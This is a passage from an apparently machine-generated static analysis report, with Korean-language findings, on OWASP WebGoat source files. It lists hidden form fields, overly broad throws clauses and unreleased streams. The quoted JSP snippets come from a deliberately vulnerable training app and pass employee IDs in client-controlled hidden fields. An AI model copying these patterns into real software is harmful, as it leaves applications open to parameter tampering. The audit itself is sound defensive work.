                        <Issue iid="CD83647E67EDA4BFB5EDF60573C7BA38" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>숨겨진 폼 필드가 EditProfile.jsp의 122 줄에 사용됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>122</LineStart>
<Snippet>				  		
                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=CrossSiteScripting.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=CrossSiteScripting.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=CrossSiteScripting.UPDATEPROFILE_ACTION%&gt;"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="9316BBE3F97DD886FEB0C22EFD4F9CF7" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>숨겨진 폼 필드가 ViewProfile.jsp의 119 줄에 사용됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>119</LineStart>
<Snippet>					%&gt;
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=CrossSiteScripting.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=CrossSiteScripting.LISTSTAFF_ACTION%&gt;"/&gt;
						&lt;/form&gt;&lt;/td&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="9316BBE3F97DD886FEB0C22EFD4F9CF9" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>숨겨진 폼 필드가 ViewProfile.jsp의 144 줄에 사용됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>144</LineStart>
<Snippet>					%&gt;
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=CrossSiteScripting.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=CrossSiteScripting.DELETEPROFILE_ACTION%&gt;"/&gt;
						&lt;/form&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="9316BBE3F97DD886FEB0C22EFD4F9CFA" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>숨겨진 폼 필드가 ViewProfile.jsp의 117 줄에 사용됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>117</LineStart>
<Snippet>					 %&gt;
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=RoleBasedAccessControl.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.LISTSTAFF_ACTION%&gt;"/&gt;
						&lt;/form&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="9316BBE3F97DD886FEB0C22EFD4F9CFF" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>숨겨진 폼 필드가 ViewProfile.jsp의 139 줄에 사용됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>139</LineStart>
<Snippet>					%&gt;
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=SQLInjection.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=SQLInjection.DELETEPROFILE_ACTION%&gt;"/&gt;
						&lt;/form&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="9316BBE3F97DD886FEB0C22EFD4F9CFE" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>숨겨진 폼 필드가 ViewProfile.jsp의 126 줄에 사용됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>126</LineStart>
<Snippet>					 %&gt;
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=SQLInjection.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=SQLInjection.EDITPROFILE_ACTION%&gt;"/&gt;
						&lt;/form&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="CD83647E67EDA4BFB5EDF60573C7BA3C" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>숨겨진 폼 필드가 EditProfile.jsp의 122 줄에 사용됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>122</LineStart>
<Snippet>				  		
                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=SQLInjection.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=SQLInjection.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=SQLInjection.UPDATEPROFILE_ACTION%&gt;"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="CD83647E67EDA4BFB5EDF60573C7BA39" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>숨겨진 폼 필드가 EditProfile.jsp의 123 줄에 사용됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>123</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=CrossSiteScripting.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=CrossSiteScripting.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=CrossSiteScripting.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="9316BBE3F97DD886FEB0C22EFD4F9CFB" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>숨겨진 폼 필드가 ViewProfile.jsp의 129 줄에 사용됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>129</LineStart>
<Snippet>					 %&gt;
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=RoleBasedAccessControl.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.EDITPROFILE_ACTION%&gt;"/&gt;
						&lt;/form&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="9316BBE3F97DD886FEB0C22EFD4F9CFD" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>숨겨진 폼 필드가 ViewProfile.jsp의 113 줄에 사용됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>113</LineStart>
<Snippet>					 %&gt;                	
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=SQLInjection.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=SQLInjection.LISTSTAFF_ACTION%&gt;"/&gt;
						&lt;/form&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="9316BBE3F97DD886FEB0C22EFD4F9CF8" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>숨겨진 폼 필드가 ViewProfile.jsp의 131 줄에 사용됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>131</LineStart>
<Snippet>					%&gt;
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=CrossSiteScripting.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=CrossSiteScripting.EDITPROFILE_ACTION%&gt;"/&gt;
						&lt;/form&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="CD83647E67EDA4BFB5EDF60573C7BA3D" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>숨겨진 폼 필드가 EditProfile.jsp의 123 줄에 사용됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>123</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=SQLInjection.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=SQLInjection.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=SQLInjection.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="15">
                        <groupTitle>Poor Error Handling: Overly Broad Throws</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>BackDoors.java의 concept1() 메서드는 일반 예외 사항(generic exception)이 발생하기 때문에 호출자가 오류 처리 및 복구 작업을 하기가 어려워집니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>메서드를 Exception 또는 Throwable이 발생하도록 선언하면 호출자가 올바른 오류 처리 및 오류 복구 작업을 수행하기 어렵습니다. Java의 예외 메커니즘은 호출자가 손쉽게 잘못을 예상하고 각각의 고유한 예외 상황을 처리하기 위한 코드를 쓸 수 있도록 설계되어 있습니다. 일반적인 형태의 예외 사항이 발생하도록 메서드를 선언하면 이런 메커니즘이 아무 소용이 없습니다.

예제: 다음 메서드는 세 가지 형식의 예외 사항이 발생합니다.


public void doExchange()
  throws IOException, InvocationTargetException,
         SQLException {
  ...
}



코드를 다음과 같이 쓰는 것이 깔끔해 보입니다.


public void doExchange()
  throws Exception {
  ...
}


하지만 이 방법은 호출자가 발생하는 예외 사항을 이해하고 처리하는 기능을 방해합니다. 또한 doExchange()의 이후 수정 버전에서 이전 예외 사항과 다르게 처리해야 하는 새 형식의 예외 사항을 도입하는 경우 이 요구 사항을 쉽게 적용할 수 없습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Exception 또는 Throwable이 발생하도록 메서드를 선언하지 마십시오. 메서드에서 발생한 예외 사항을 복구할 수 없거나 호출자가 쉽게 파악할 수 없는 경우 검사하는 예외 사항 대신 검사하지 않는 예외 사항 발생을 고려해 보십시오. Exception 대신 RuntimeException 또는 Error를 확장하거나 메서드에 try/catch 래퍼를 추가하여 검사할 예외 사항을 검사하지 않는 예외로 변환하는 예외 클래스를 구현하면 됩니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>15</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="D9C7CC39D5B7A558E88FA78611553BF4" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Challenge2Screen.java의 showDefaceAttempt() 메서드는 일반 예외 사항(generic exception)이 발생하기 때문에 호출자가 오류 처리 및 복구 작업을 하기가 어려워집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>397</LineStart>
<Snippet>

    private Element showDefaceAttempt(WebSession s) throws Exception
    {
	ElementContainer ec = new ElementContainer();</Snippet>
<TargetFunction>Function: showDefaceAttempt()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7DCAF2F4819DDFC80CC5DDD5783F98D8" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonAdapter.java의 doStage6() 메서드는 일반 예외 사항(generic exception)이 발생하기 때문에 호출자가 오류 처리 및 복구 작업을 하기가 어려워집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>184</LineStart>
<Snippet>

    protected Element doStage6(WebSession s) throws Exception
    {
	ElementContainer ec = new ElementContainer();</Snippet>
<TargetFunction>Function: doStage6()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F3E81447B7A253F2AB8E9FF9EBE13A3F" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonAdapter.java의 doStage5() 메서드는 일반 예외 사항(generic exception)이 발생하기 때문에 호출자가 오류 처리 및 복구 작업을 하기가 어려워집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>176</LineStart>
<Snippet>

    protected Element doStage5(WebSession s) throws Exception
    {
	ElementContainer ec = new ElementContainer();</Snippet>
<TargetFunction>Function: doStage5()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3CEFB658C858D961F2C1942155C3C953" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>BackDoors.java의 concept2() 메서드는 일반 예외 사항(generic exception)이 발생하기 때문에 호출자가 오류 처리 및 복구 작업을 하기가 어려워집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>BackDoors.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BackDoors.java</FilePath>
<LineStart>142</LineStart>
<Snippet>

    protected Element concept2(WebSession s) throws Exception
    {
	ElementContainer ec = new ElementContainer();</Snippet>
<TargetFunction>Function: concept2()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B1EAD77CBD01B93091502EBF26A4247B" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>HttpSplitting.java의 createAttackEnvironment() 메서드는 일반 예외 사항(generic exception)이 발생하기 때문에 호출자가 오류 처리 및 복구 작업을 하기가 어려워집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HttpSplitting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpSplitting.java</FilePath>
<LineStart>161</LineStart>
<Snippet>

    protected Element createAttackEnvironment(WebSession s) throws Exception
    {
	ElementContainer ec = new ElementContainer();</Snippet>
<TargetFunction>Function: createAttackEnvironment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="022767F21A8D334E484C3E7CEC2C6749" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>BackDoors.java의 concept1() 메서드는 일반 예외 사항(generic exception)이 발생하기 때문에 호출자가 오류 처리 및 복구 작업을 하기가 어려워집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>BackDoors.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BackDoors.java</FilePath>
<LineStart>87</LineStart>
<Snippet>

    protected Element concept1(WebSession s) throws Exception
    {
	ElementContainer ec = new ElementContainer();</Snippet>
<TargetFunction>Function: concept1()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="543877893EBD02DFE17A9E604F23A9F3" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WeakAuthenticationCookie.java의 checkCookie() 메서드는 일반 예외 사항(generic exception)이 발생하기 때문에 호출자가 오류 처리 및 복구 작업을 하기가 어려워집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WeakAuthenticationCookie.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakAuthenticationCookie.java</FilePath>
<LineStart>85</LineStart>
<Snippet>     * @exception  Exception  Description of the Exception
     */
    protected String checkCookie(WebSession s) throws Exception
    {
	String cookie = getCookie(s);</Snippet>
<TargetFunction>Function: checkCookie()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DFD20D8A60BD076F656B2B332AA1F9B2" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WeakAuthenticationCookie.java의 makeUser() 메서드는 일반 예외 사항(generic exception)이 발생하기 때문에 호출자가 오류 처리 및 복구 작업을 하기가 어려워집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WeakAuthenticationCookie.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakAuthenticationCookie.java</FilePath>
<LineStart>373</LineStart>
<Snippet>     * @exception  Exception  Description of the Exception
     */
    protected Element makeUser(WebSession s, String user, String method)
	    throws Exception
    {</Snippet>
<TargetFunction>Function: makeUser()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4767A39CC82624C8DF94CE558388608F" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>HtmlClues.java의 makeUser() 메서드는 일반 예외 사항(generic exception)이 발생하기 때문에 호출자가 오류 처리 및 복구 작업을 하기가 어려워집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HtmlClues.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HtmlClues.java</FilePath>
<LineStart>135</LineStart>
<Snippet>     * @exception  Exception  Description of the Exception
     */
    protected Element makeUser(WebSession s, String user, String method)
	    throws Exception
    {</Snippet>
<TargetFunction>Function: makeUser()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="20D8D8DC490B4033D5BED8E678B7B761" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonAdapter.java의 doStage4() 메서드는 일반 예외 사항(generic exception)이 발생하기 때문에 호출자가 오류 처리 및 복구 작업을 하기가 어려워집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>168</LineStart>
<Snippet>

    protected Element doStage4(WebSession s) throws Exception
    {
	ElementContainer ec = new ElementContainer();</Snippet>
<TargetFunction>Function: doStage4()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8C3759D2B027E1A49E71D3884549506C" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>HttpSplitting.java의 doCachePoisining() 메서드는 일반 예외 사항(generic exception)이 발생하기 때문에 호출자가 오류 처리 및 복구 작업을 하기가 어려워집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HttpSplitting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpSplitting.java</FilePath>
<LineStart>191</LineStart>
<Snippet>

    protected Element doCachePoisining(WebSession s) throws Exception
    {
	ElementContainer ec = new ElementContainer();</Snippet>
<TargetFunction>Function: doCachePoisining()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="210AA1A8EFBCB73D3D72870FCFCE5041" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonAdapter.java의 doStage1() 메서드는 일반 예외 사항(generic exception)이 발생하기 때문에 호출자가 오류 처리 및 복구 작업을 하기가 어려워집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>144</LineStart>
<Snippet>

    protected Element doStage1(WebSession s) throws Exception
    {
	ElementContainer ec = new ElementContainer();</Snippet>
<TargetFunction>Function: doStage1()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5503BCF906889669D3706765FAA2A3D8" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonAdapter.java의 doStage2() 메서드는 일반 예외 사항(generic exception)이 발생하기 때문에 호출자가 오류 처리 및 복구 작업을 하기가 어려워집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>152</LineStart>
<Snippet>

    protected Element doStage2(WebSession s) throws Exception
    {
	ElementContainer ec = new ElementContainer();</Snippet>
<TargetFunction>Function: doStage2()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="444E18A164A77C9987658EB0D0F46EBF" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonAdapter.java의 doStage3() 메서드는 일반 예외 사항(generic exception)이 발생하기 때문에 호출자가 오류 처리 및 복구 작업을 하기가 어려워집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>160</LineStart>
<Snippet>

    protected Element doStage3(WebSession s) throws Exception
    {
	ElementContainer ec = new ElementContainer();</Snippet>
<TargetFunction>Function: doStage3()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7A9D14739BA15F55897876721C44C389" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WeakAuthenticationCookie.java의 checkParams() 메서드는 일반 예외 사항(generic exception)이 발생하기 때문에 호출자가 오류 처리 및 복구 작업을 하기가 어려워집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WeakAuthenticationCookie.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakAuthenticationCookie.java</FilePath>
<LineStart>124</LineStart>
<Snippet>     * @exception  Exception  Description of the Exception
     */
    protected String checkParams(WebSession s) throws Exception
    {
	String username = s.getParser().getStringParameter(USERNAME, "");</Snippet>
<TargetFunction>Function: checkParams()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="15">
                        <groupTitle>Unreleased Resource: Streams</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>AbstractLesson.java의 getLessonPlan() 함수는 567 줄의 FileReader()에 의해 할당된 시스템 리소스를 해제하지 못할 수도 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>프로그램이 시스템 리소스를 해제하지 못할 수도 있습니다.

리소스 누출은 최소한 두 가지 공통 원인이 있습니다.

- 오류 조건 및 기타 예외 상황.

- 프로그램의 어떤 부분이 리소스 해제를 담당하고 있는지에 대한 혼란

대부분의 공개되지 않은 리소스 문제는 일반적인 소프트웨어 안정성 문제를 일으킵니다. 하지만 공격자가 의도적으로 리소스 누출을 일으킬 수 있는 경우 공격자가 리소스 풀을 고갈시켜 DoS(Denial of Service) 공격을 실행할 수도 있습니다.

예제: 다음 메서드는 자신이 연 파일 핸들을 닫지 않습니다. FileInputStream의 finalize() 메서드는 결국 close()를 호출하지만 finalize() 메서드를 호출하기까지 시간이 얼마나 걸릴지 장담할 수 없습니다. 사용량이 많은 환경에서는 이로 인해 JVM이 파일 핸들을 모두 소진시키는 결과를 초래할 수도 있습니다.

private void processFile(String fName) throws FileNotFoundException, IOException {
  FileInputStream fis = new FileInputStream(fName);
  int sz;
  byte[] byteArray = new byte[BLOCK_SIZE];
  while ((sz = fis.read(byteArray)) != -1) {
    processBytes(byteArray, sz);
  }
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
